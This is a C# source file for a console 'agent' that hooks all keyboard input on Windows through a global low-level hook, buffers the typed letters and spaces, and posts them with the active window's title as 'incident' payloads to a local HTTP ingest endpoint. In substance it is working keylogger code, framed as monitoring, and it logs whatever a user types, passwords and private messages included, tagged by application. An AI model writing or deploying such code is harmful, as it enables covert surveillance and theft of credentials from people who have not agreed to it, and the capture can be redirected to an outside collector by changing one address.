using System.Net.Http.Json;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Threading;

namespace Agent;

public record IncidentPayload(string Text, string Source, DateTime Timestamp);

internal static class Program
{
    private static readonly HttpClient Client = new();
    private static readonly StringBuilder Buffer = new();
    private static readonly object LockObj = new();
    private static CancellationTokenSource? _cts;
    private const string IngestUrl = "http://127.0.0.1:4820/ingest";
    private const int MaxBufferLength = 240;
    private const int IdleFlushMs = 2000;

    private static LowLevelKeyboardProc? _keyboardProc;
    private static nint _keyboardHook = nint.Zero;
    private static System.Threading.Timer? _idleTimer;

    // Native imports
    private delegate nint LowLevelKeyboardProc(int nCode, nint wParam, nint lParam);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, nint hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(nint hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint CallNextHookEx(nint hhk, int nCode, nint wParam, nint lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern nint GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    private static extern nint GetForegroundWindow();
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetWindowText(nint hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);
    [DllImport("user32.dll")]
    private static extern nint GetKeyboardLayout(uint idThread);
    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, nint dwhkl);
    
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const uint MAPVK_VK_TO_VSC = 0;

    public static async Task<int> Main(string[] args)
    {
        _cts = new CancellationTokenSource();
        var appContext = new ApplicationContext();

        Console.CancelKeyPress += (_, e) =>
        {
            e.Cancel = true;
            _cts.Cancel();
            appContext.ExitThread();
        };

        Console.WriteLine("[agent] Starting keyboard monitor...");
        StartKeyboardHook();

        // Background loops
        var statusTask = StatusLoop(_cts.Token);

        Console.WriteLine("[agent] Running. Press Ctrl+C to stop.");
        // Run a message loop so the low-level hook stays alive.
        Application.Run(appContext);

        // After exit
        _cts.Cancel();
        try
        {
            await Task.WhenAll(statusTask);
        }
        catch (OperationCanceledException)
        {
            // expected
        }
        finally
        {
            StopKeyboardHook();
        }

        return 0;
    }

    private static async Task StatusLoop(CancellationToken token)
    {
        while (!token.IsCancellationRequested)
        {
            await Task.Delay(TimeSpan.FromSeconds(15), token);
            Console.WriteLine($"[agent] heartbeat {DateTime.Now:T}");
        }
    }

    private static void FlushBuffer(string source)
    {
        string text;
        lock (LockObj)
        {
            if (Buffer.Length == 0) return;
            text = Buffer.ToString().Trim();
            Buffer.Clear();
        }
        // Normalize
        if (text.Length < 4) return;
        _ = SendIncidentAsync(text, source);
    }

    private static string NormalizeSource(string source)
    {
        if (string.IsNullOrWhiteSpace(source)) return "Unknown";
        // Simple normalization for now
        return source.Trim();
    }

    private static async Task SendIncidentAsync(string text, string source)
    {
         if (string.IsNullOrWhiteSpace(text)) return;
         var payload = new IncidentPayload(text, NormalizeSource(source), DateTime.UtcNow);
         try
         {
             using var response = await Client.PostAsJsonAsync(IngestUrl, payload, _cts?.Token ?? CancellationToken.None);
             Console.WriteLine($"[agent] sent {text}");
         }
         catch (Exception ex)
         {
             Console.WriteLine($"[agent] failed to send: {ex.Message}");
         }
    }

    private static void StartKeyboardHook()
    {
        _keyboardProc = HookCallback;
        using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule!;
        _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc, GetModuleHandle(curModule.ModuleName), 0);
    }

    private static void StopKeyboardHook()
    {
        if (_keyboardHook != nint.Zero)
        {
            UnhookWindowsHookEx(_keyboardHook);
            _keyboardHook = nint.Zero;
        }
    }

    private static nint HookCallback(int nCode, nint wParam, nint lParam)
    {
        if (nCode >= 0 && wParam == WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            var ch = VkToChar(vkCode);
            if (ch != '\0')
            {
               lock(LockObj) { Buffer.Append(ch); }
               RestartIdleTimer();
            }
        }
        return CallNextHookEx(_keyboardHook, nCode, wParam, lParam);
    }

    private static char VkToChar(int vkCode)
    {
        // simplified mapping
        if (vkCode >= 65 && vkCode <= 90) return (char)vkCode; 
        if (vkCode == 0x20) return ' ';
        return '\0'; 
    }

    private static void RestartIdleTimer()
    {
        _idleTimer?.Change(Timeout.Infinite, Timeout.Infinite);
        _idleTimer?.Dispose();
        _idleTimer = new System.Threading.Timer(_ =>
        {
            FlushBuffer(CurrentWindowTitle());
        }, null, IdleFlushMs, Timeout.Infinite);
    }

    private static string CurrentWindowTitle()
    {
        var handle = GetForegroundWindow();
        var sb = new StringBuilder(256);
        GetWindowText(handle, sb, sb.Capacity);
        return sb.ToString();
    }
}
